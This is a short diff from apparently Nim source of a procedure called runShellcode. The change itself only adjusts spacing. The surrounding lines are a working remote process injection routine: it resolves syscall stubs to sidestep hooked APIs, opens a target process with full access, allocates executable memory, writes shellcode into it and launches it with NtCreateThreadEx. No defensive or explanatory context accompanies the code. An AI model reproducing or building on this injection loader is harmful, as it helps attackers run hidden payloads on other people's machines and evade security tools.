@@ -174,7 +174,7 @@ proc runShellcode(shellcode: seq[byte]): void =
     success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));
     
     status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS, &oa, &cid)
-    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE); 
+    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
     status = NtWriteVirtualMemory(pHandle, ds, shellcode[0].addr, sc_size-1, addr bytesWritten);
     status = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, NULL, pHandle,ds, NULL, FALSE, 0, 0, 0, NULL);
 
